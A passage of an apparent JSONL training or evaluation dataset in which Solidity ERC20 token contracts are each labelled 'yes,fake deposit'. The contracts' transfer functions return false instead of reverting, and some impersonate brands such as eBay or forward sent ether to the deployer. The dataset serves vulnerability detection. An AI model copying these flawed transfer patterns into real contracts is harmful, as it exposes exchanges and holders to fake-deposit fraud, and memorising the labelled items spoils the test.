Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.4.11;\n\n\nlibrary SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n\n function div(uint a, uint b) internal returns (uint) {\n // assert(b > 0); // Solidity automatically throws when dividing by 0\n uint c = a / b;\n // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n return c;\n }\n\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n\n function assert(bool assertion) internal {\n if (!assertion) {\n throw;\n }\n }\n}\n\n\ncontract ERC20Basic {\n uint public totalSupply;\n function balanceOf(address _owner) constant returns (uint balance);\n function transfer(address _to, uint _value) returns (bool success);\n function transferFrom(address _from, address _to, uint _value) returns (bool success);\n}\n \n  \n \ncontract ERC20 is ERC20Basic {\n function approve(address _spender, uint _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract StandardToken is ERC20 {\n using SafeMath for uint;\n\n function transfer(address _to, uint _value) returns (bool) {\n \n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\n\ncontract Ownable {\n address public owner;\n\n\n \n function Ownable() {\n owner = msg.sender;\n }\n\n\n \n modifier onlyOwner() {\n if (msg.sender != owner) {\n throw;\n }\n _;\n }\n\n\n \n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n\n}\n\n\n\ncontract BitcoinMoonToken is StandardToken, Ownable {\n\n uint8 public decimals = 18;\n uint public totalSupply = 50000000000 * 10 ** 18; \n string public name = \"Bitcoin Moon Token\";\n string public symbol = \"BMNT\";\n\n function BitcoinMoonToken() {\n balances[msg.sender] = totalSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: MIT\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\ncontract eBayToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"eBay Token (Official)\";\n string public constant symbol = \"EBAY\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Diamond_Shiba_Inu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Diamond Shiba Inu\";\n string public constant symbol = \"DINU\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.12;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract JuneteenthToken is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function JuneteenthToken(\n ) {\n balances[msg.sender] = 100000000000000 * 10**10;\n totalSupply = 100000000000000 * 10**10;\n name = \"Juneteenth Token\";\n decimals = 10;\n symbol = \"JUNETEENTH\";\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//Cryptoken\n//\u023b\n\npragma solidity ^0.4.11;\n\ncontract Token {\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n}\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Cryptoken is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n\n string public name = \"Cryptoken\"; \n uint8 public decimals = 22; \n string public symbol = \"CTN\";\n string public version = 'H1.0'; \n\n\n\n\n function Cryptoken(\n ) {\n balances[msg.sender] = 500000000000000000000000000000000; \n totalSupply = 500000000000000000000000000000000; \n name = \"Cryptoken\"; \n decimals = 22; \n symbol = \"CTN\"; \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract SkyDoge is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'SOGE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function SkyDoge() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Sky Doge\";\n decimals = 18; \n symbol = \"SOGE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract TokREI is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n\n function TokREI(\n ) {\n balances[msg.sender] = 1000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000; // Update total supply (100000 for example)\n name = \"TokREI\"; // Set the name for display purposes\n decimals = 5; // Amount of decimals for display purposes\n symbol = \"TREI\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract GoldenRetriever is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'GOLDEN1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function GoldenRetriever() {\n balances[msg.sender] = 100000000000000000000000000000; \n totalSupply = 100000000000000000000000000000;\n name = \"Golden Retriever\";\n decimals = 18; \n symbol = \"GOLDEN\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract WAKANDAINUTOKENETH is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'WKDE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function WAKANDAINUTOKENETH() {\n balances[msg.sender] = 100000000000000000000000000000; \n totalSupply = 100000000000000000000000000000;\n name = \"WAKANDA INU TOKEN ETH\";\n decimals = 18; \n symbol = \"WKDE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; 